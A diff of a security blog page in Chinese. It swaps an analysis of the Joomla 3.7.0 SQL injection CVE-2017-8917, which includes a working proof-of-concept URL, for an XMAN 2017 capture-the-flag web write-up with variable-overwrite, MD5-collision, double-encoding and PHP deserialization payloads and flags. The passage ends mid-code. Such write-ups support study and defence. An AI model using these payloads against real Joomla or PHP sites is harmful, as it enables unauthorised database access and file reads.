@@ -71,7 +71,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="代码审计,SQL注入,漏洞分析," />
+  <meta name="keywords" content="Hexo, NexT" />
 
 
 
@@ -89,29 +89,23 @@
 
 
 
-<meta name="description" content="Joomla!3.7.0 Core SQL注入漏洞.">
+<meta name="description" content="variacover123456789101112131415161718&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;?phperror_reporting(0);if (empty($_GET[&apos;b&apos;])) &amp;#123;   show_source(__FILE__);   die();&amp;#125;else&amp;#123;   include(&apos;flag.php&apos;);$a = &quot;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析">
-<meta property="og:url" content="http://yoursite.com/2017/05/19/CVE-2017-8917-Joomla-3-7-0-SQL-Injection分析/index.html">
+<meta property="og:title" content="XMAN选拔赛-2017-web-writeup">
+<meta property="og:url" content="http://yoursite.com/2017/07/16/XMAN选拔赛-2017-web-writeup/index.html">
 <meta property="og:site_name" content="Chybeta">
-<meta property="og:description" content="Joomla!3.7.0 Core SQL注入漏洞.">
-<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/calldisplay.jpg">
-<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/viewdisplay2.jpg?raw=true">
-<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/getState.jpg?raw=true">
-<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/callpopulateState.jpg">
-<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/fullordering.jpg">
-<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/thissetstate.jpg?raw=true">
-<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/arraylist.jpg?raw=true">
-<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/getitem.jpg?raw=true">
-<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/callgetitem.jpg?raw=true">
-<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/listordering2.jpg?raw=true">
-<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/listfullordering3.jpg?raw=true">
-<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/poc.jpg?raw=true">
-<meta property="og:updated_time" content="2017-05-19T09:48:14.439Z">
+<meta property="og:description" content="variacover123456789101112131415161718&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;?phperror_reporting(0);if (empty($_GET[&apos;b&apos;])) &amp;#123;   show_source(__FILE__);   die();&amp;#125;else&amp;#123;   include(&apos;flag.php&apos;);$a = &quot;">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/1.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/2.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/3.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/4.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/5.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/6.jpg?raw=true">
+<meta property="og:updated_time" content="2017-07-16T07:02:13.998Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析">
-<meta name="twitter:description" content="Joomla!3.7.0 Core SQL注入漏洞.">
-<meta name="twitter:image" content="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/calldisplay.jpg">
+<meta name="twitter:title" content="XMAN选拔赛-2017-web-writeup">
+<meta name="twitter:description" content="variacover123456789101112131415161718&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;?phperror_reporting(0);if (empty($_GET[&apos;b&apos;])) &amp;#123;   show_source(__FILE__);   die();&amp;#125;else&amp;#123;   include(&apos;flag.php&apos;);$a = &quot;">
+<meta name="twitter:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/1.jpg?raw=true">
 
 
 
@@ -139,13 +133,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/05/19/CVE-2017-8917-Joomla-3-7-0-SQL-Injection分析/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/07/16/XMAN选拔赛-2017-web-writeup/"/>
 
 
 
 
 
-  <title> [CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析 | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  <title> XMAN选拔赛-2017-web-writeup | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -311,7 +305,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/05/19/CVE-2017-8917-Joomla-3-7-0-SQL-Injection分析/">
+  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/16/XMAN选拔赛-2017-web-writeup/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="chybeta">
@@ -335,7 +329,7 @@
             
             
               
-                [CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析
+                XMAN选拔赛-2017-web-writeup
               
             
           </h1>
@@ -350,8 +344,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-05-19T09:39:18+08:00">
-                2017-05-19
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-07-16T11:03:50+08:00">
+                2017-07-16
               </time>
             
 
@@ -361,28 +355,6 @@
           </span>
 
           
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web安全/" itemprop="url" rel="index">
-                    <span itemprop="name">Web安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
 
           
             
@@ -392,7 +364,7 @@
 
           
           
-             <span id="/2017/05/19/CVE-2017-8917-Joomla-3-7-0-SQL-Injection分析/" class="leancloud_visitors" data-flag-title="[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析">
+             <span id="/2017/07/16/XMAN选拔赛-2017-web-writeup/" class="leancloud_visitors" data-flag-title="XMAN选拔赛-2017-web-writeup">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -419,43 +391,34 @@
       
 
       
-        <p>Joomla!3.7.0 Core SQL注入漏洞.<br><a id="more"></a></p>
-<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>这次干脆先放出poc吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/Joomla370/index.php?</div><div class="line">option=com_fields</div><div class="line">&amp;view=fields</div><div class="line">&amp;layout=modal</div><div class="line">&amp;list[fullordering]=updatexml(1,concat(0x3e,database()),0)</div></pre></td></tr></table></figure></p>
-<p>这次根据参数的传入流程来进行分析。</p>
-<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><h2 id="危害组件"><a href="#危害组件" class="headerlink" title="危害组件"></a>危害组件</h2><p>3.7.0版本中出现了<code>com_field</code>组件,无需授权即可访问。查看<code>...\components\com_fields\controller.php</code>，在第27行左右，其相关代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config = array<span class="params">()</span>)</span></span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">$this</span>-&gt;input = JFactory::getApplication()-&gt;input;</div><div class="line"></div><div class="line">		<span class="comment">// Frontpage Editor Fields Button proxying:</span></div><div class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'view'</span>) === <span class="string">'fields'</span> &amp;&amp; <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'layout'</span>) === <span class="string">'modal'</span>)</div><div class="line">		&#123;</div><div class="line">			<span class="comment">// Load the backend language file.</span></div><div class="line">			$lang = JFactory::getLanguage();</div><div class="line">			$lang-&gt;load(<span class="string">'com_fields'</span>, JPATH_ADMINISTRATOR);</div><div class="line"></div><div class="line">			$config[<span class="string">'base_path'</span>] = JPATH_COMPONENT_ADMINISTRATOR;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">parent</span>::__construct($config);</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
-<p>可以看到它先判断通过<code>view</code>是否等于<code>fields</code>,<code>layout</code>是否等于<code>modal</code>,而这两个参数都是我们可控的。若满足则将会加载<code>JPATH_ADMINISTRATOR</code>中的<code>com_fields</code>组件，并且将<code>base_path</code>设置为 <code>JPATH_COMPONENT_ADMINISTRATOR</code>，之后调用父类的构造方法。</p>
-<h2 id="传入sql语句"><a href="#传入sql语句" class="headerlink" title="传入sql语句"></a>传入sql语句</h2><p>在调用父类构造方法后，一路运行到<code>...\Joomla370\libraries\legacy\controller\legacy.php</code>中，约莫707行，这时会通过<code>$this-&gt;$doTask</code>调用<code>display()</code>函数。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/calldisplay.jpg" alt=""></p>
-<p>跟进<code>display()</code>函数，它位于 <code>...\Joomla370\libraries\legacy\controller\legacy.php</code>，接着运行至legacy.php的约莫671行左右，调用了视图（view）的<code>display()</code>函数。我们跟进一下，跳转进入<code>...\Joomla370\administrator\components\com_fields\views\fields\view.html.php</code>，</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/viewdisplay2.jpg?raw=true" alt=""></p>
-<p>此时运行到，下面这条语句，给<code>get()</code>传入的参数为<code>State</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">$this</span>-&gt;state         = <span class="keyword">$this</span>-&gt;get(<span class="string">'State'</span>);</div></pre></td></tr></table></figure>
-<p>我们跟进这个<code>get()</code>函数，一直运行到422行，</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/getState.jpg?raw=true" alt=""></p>
-<p>之后将会调用 <code>getState()</code>，跟进，进入<code>...\Joomla370\libraries\legacy\model\legacy.php</code></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/callpopulateState.jpg" alt=""></p>
-<p>之后会调用filedsModel类中的<code>populateState()</code>，跟进后会发现调用其父类的<code>populateState()</code>函数，其定义在 <code>...\Joomla370\libraries\legacy\model\list.php</code>中，约莫在第495行，相关代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">..省略..</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($list = $app-&gt;getUserStateFromRequest(<span class="keyword">$this</span>-&gt;context . <span class="string">'.list'</span>, <span class="string">'list'</span>, <span class="keyword">array</span>(), <span class="string">'array'</span>))</div><div class="line"></div><div class="line">..省略..</div></pre></td></tr></table></figure></p>
-<p>这里我们先跟进一下<code>getUserStateFromRequest()</code>，它的定义在<code>...\Joomla370\libraries\cms\application\cms.php</code>中，在该函数结束后，它获取了我们通过get方法传入的参数，也就是说，我们成功的控制了<code>fullordering</code>的值。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/fullordering.jpg" alt=""></p>
-<p>在该函数运行完后，流程将会回到前面的那个定义在<code>...\Joomla370\libraries\cms\application\cms.php</code>中的<code>populateState()</code>函数。此时运行的代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">foreach</span> ($list <span class="keyword">as</span> $name =&gt; $value)</div><div class="line">&#123;</div><div class="line">	<span class="comment">// Exclude if blacklisted</span></div><div class="line">	<span class="keyword">if</span> (!in_array($name, <span class="keyword">$this</span>-&gt;listBlacklist))</div><div class="line">	&#123;</div><div class="line">		<span class="comment">// Extra validations</span></div><div class="line">		<span class="keyword">switch</span> ($name)&#123;...&#125;</div><div class="line">		<span class="keyword">$this</span>-&gt;setState(<span class="string">'list.'</span> . $name, $value);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>如果数组的key不在黑名单（blacklisted）中，将会为<code>$list</code>变量根据相应的<code>State</code>进行注册，在这部分函数运行到结束部分，可以看见成功的控制了<code>list</code>数组的<code>fullordering</code>的值。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/thissetstate.jpg?raw=true" alt=""></p>
-<p>查看变量，如下：</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/arraylist.jpg?raw=true" alt=""></p>
-<h2 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h2><p>接下来继续运行，一直运行回到<code>Joomla370\administrator\components\com_fields\views\fields\view.html.php</code>中的<code>display()</code>函数中。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/getitem.jpg?raw=true" alt=""></p>
-<p>跟进这一行 <code>$this-&gt;get(&#39;Items&#39;);</code>，进入<code>...\Joomla370\libraries\legacy\view\legacy.php</code>，约莫在422行,这里的行为跟前面分析类似，此后将会调用<code>getitem()</code>：</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/callgetitem.jpg?raw=true" alt=""></p>
-<p>继续跟进，进入<code>...\Joomla370\libraries\legacy\model\list.php</code>，约莫在186行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span></div><div class="line">	&#123;</div><div class="line">		<span class="comment">// Load the list items and add the items to the internal cache.</span></div><div class="line">		<span class="keyword">$this</span>-&gt;cache[$store] = <span class="keyword">$this</span>-&gt;_getList(<span class="keyword">$this</span>-&gt;_getListQuery(), <span class="keyword">$this</span>-&gt;getStart(), <span class="keyword">$this</span>-&gt;getState(<span class="string">'list.limit'</span>));</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
-<p>通过<code>_getList</code>调用了<code>_getListQuery</code>,继续跟进，进入<code>...\Joomla370\libraries\legacy\model\list.php</code>，约莫在 132行，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">if ($lastStoreId != $currentStoreId || empty($this-&gt;query))</div><div class="line">&#123;</div><div class="line">	$lastStoreId = $currentStoreId;</div><div class="line">	$this-&gt;query = $this-&gt;getListQuery();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>调用了 <code>getListQuery()</code>，继续跟进，进入 <code>...\Joomla370\administrator\components\com_fields\models\fields.php</code>,一直运行到约莫在 305 行，调用<code>getState</code>方法，传入<code>list.fullordering</code>参数。相关代码如下：</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/listordering2.jpg?raw=true" alt=""></p>
-<p>查看变量表：</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/listfullordering3.jpg?raw=true" alt=""></p>
-<p>之后在第314行，将<code>$listOrdering</code>带入查询，相关代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$query-&gt;order($db-&gt;escape($listOrdering) . <span class="string">' '</span> . $db-&gt;escape($orderDirn));</div></pre></td></tr></table></figure></p>
-<p>在进行<code>$query-&gt;order</code>之前，会先进行一次过滤，跟进<code>$db-&gt;escape</code>，进入<code>...\Joomla370\libraries\joomla\database\driver\mysqli.php</code>，约莫242行，相关代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">($text, $extra = false)</span></span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">$this</span>-&gt;connect();</div><div class="line"></div><div class="line">		$result = mysqli_real_escape_string(<span class="keyword">$this</span>-&gt;getConnection(), $text);</div><div class="line"></div><div class="line">		<span class="keyword">if</span> ($extra)</div><div class="line">		&#123;</div><div class="line">			$result = addcslashes($result, <span class="string">'%_'</span>);</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">return</span> $result;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
-<p>对于传入的<code>$text</code>通过<code>mysqli_real_escape_string()</code>进行过滤，只转义了一些字符。因此可以通过构造进行成功的注入。</p>
-<h1 id="成功注入"><a href="#成功注入" class="headerlink" title="成功注入"></a>成功注入</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/poc.jpg?raw=true" alt=""></p>
+        <h1 id="variacover"><a href="#variacover" class="headerlink" title="variacover"></a>variacover</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_GET[<span class="string">'b'</span>])) &#123;</div><div class="line">   show_source(<span class="keyword">__FILE__</span>);</div><div class="line">   <span class="keyword">die</span>();</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">   <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</div><div class="line">$a = <span class="string">"www.XMAN.com"</span>;</div><div class="line">$b = $_GET[<span class="string">'b'</span>];</div><div class="line">@parse_str($b);</div><div class="line"><span class="keyword">if</span> ($a[<span class="number">0</span>] != <span class="string">'QNKCDZO'</span> &amp;&amp; md5($a[<span class="number">0</span>]) == md5(<span class="string">'QNKCDZO'</span>)) &#123;</div><div class="line">   <span class="keyword">echo</span> $flag;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">exit</span>(<span class="string">'你的答案不对0.0'</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>parse_str变量覆盖漏洞，和php弱类型比较问题。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7771/?b=a[0]=240610708</div></pre></td></tr></table></figure>
+<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;A_sTr_covcderd_t3st_you_oW?&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="urldecode"><a href="#urldecode" class="headerlink" title="urldecode"></a>urldecode</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/1.jpg?raw=true" alt=""></p>
+<p>改为XMAN后提示urldecode：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/2.jpg?raw=true" alt=""></p>
+<p>考点应该是类似二次注入类型，<br>将XMAN进行一次urlencode，再把其中的%替换为%25，最后的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7772/?me=%2558%254d%2541%254e</div></pre></td></tr></table></figure></p>
+<p>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;UrlDeCode_CooL_yOu_u0D3rSta9D!</div></pre></td></tr></table></figure></p>
+<p>#<br>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7774/?code=1</div></pre></td></tr></table></figure></p>
+<p>得到hint: flag.php。访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7774/flag.php</div></pre></td></tr></table></figure></p>
+<p>得到hint2: help.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7774/help.php</div></pre></td></tr></table></figure></p>
+<p>得到hint3：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">class FileClass&#123; public $filename = &apos;error.log&apos;; public function __toString()&#123; return file_get_contents($this-&gt;filename); &#125; &#125;</div></pre></td></tr></table></figure></p>
+<p>知道是反序列化问题，用下面代码生成：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileClass</span></span>&#123;</div><div class="line">	<span class="keyword">public</span> $filename = <span class="string">'error.log'</span>;</div><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">		<span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$chybeta = <span class="keyword">new</span> FileClass();</div><div class="line">$chybeta-&gt;filename = <span class="string">'flag.php'</span>;</div><div class="line"><span class="keyword">echo</span> serialize($chybeta);</div></pre></td></tr></table></figure></p>
+<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7774/?code=O:9:&quot;FileClass&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</div></pre></td></tr></table></figure></p>
+<p>最后flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;UUNser1AL1Z3_XMAN__0)(0&#125;</div></pre></td></tr></table></figure></p>
+<p>这题源码：<br>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">'code'</span>]))&#123;</div><div class="line"><span class="keyword">exit</span>(<span class="string">'?code='</span>);</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileClass</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $filename = <span class="string">'error.log'</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;  </div><div class="line">    <span class="keyword">public</span> $name = <span class="string">''</span>;  </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>  </span></div><div class="line">    &#123;  </div><div class="line">        <span class="keyword">return</span> <span class="string">'User '</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">' is '</span> . <span class="keyword">$this</span>-&gt;age . <span class="string">' years old. &lt;br /&gt;'</span>;  </div><div class="line">    &#125;  </div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> <span class="string">"hint: flag.php"</span>;</div><div class="line">$obj = unserialize($_GET[<span class="string">'code'</span>]);</div><div class="line"><span class="keyword">echo</span> $obj;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>扫到index.php~，源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$a=<span class="number">0</span>;</div><div class="line">$b=<span class="number">0</span>;</div><div class="line">$c=<span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'aaa'</span>]))</div><div class="line">&#123;</div><div class="line">        $aaa = $_GET[<span class="string">'aaa'</span>];</div><div class="line">		$aaa==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"Emmm..."</span>):<span class="keyword">NULL</span>;</div><div class="line">        <span class="keyword">switch</span> ($aaa)</div><div class="line">        &#123;</div><div class="line">        <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">                $a=<span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line">$bbb=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'bbb'</span>]);</div><div class="line"><span class="keyword">if</span>(is_array($bbb))&#123;</div><div class="line">    is_numeric(@$bbb[<span class="string">"ccc"</span>])?<span class="keyword">die</span>(<span class="string">"Emmm..."</span>):<span class="keyword">NULL</span>;</div><div class="line">    <span class="keyword">if</span>(@$bbb[<span class="string">"ccc"</span>])&#123;</div><div class="line">        ($bbb[<span class="string">"ccc"</span>]&gt;<span class="number">2017</span>)?$b=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">    &#125;</div><div class="line">	<span class="keyword">if</span>(is_array(@$bbb[<span class="string">"ddd"</span>]))&#123;</div><div class="line">        <span class="keyword">if</span>(count($bbb[<span class="string">"ddd"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($bbb[<span class="string">"ddd"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"Emmm..."</span>);</div><div class="line">        $eee = array_search(<span class="string">"XMAN"</span>, $bbb[<span class="string">"ddd"</span>]);</div><div class="line">        $eee===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"Emmm..."</span>):<span class="keyword">NULL</span>;</div><div class="line">        <span class="keyword">foreach</span>($bbb[<span class="string">"ddd"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</div><div class="line">            